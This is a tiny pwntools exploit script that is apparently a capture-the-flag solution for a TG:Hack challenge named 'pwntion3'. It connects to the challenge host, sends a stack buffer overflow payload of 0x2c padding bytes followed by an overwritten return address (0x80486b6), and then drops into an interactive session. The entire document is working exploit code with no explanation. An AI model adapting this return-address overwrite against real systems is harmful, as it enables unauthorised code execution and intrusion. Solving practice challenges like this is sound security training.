from pwn import *
p=remote('pwntion3.tghack.no',1063)

p.send('A'*0x2c+p32(0x80486b6))
p.interactive()
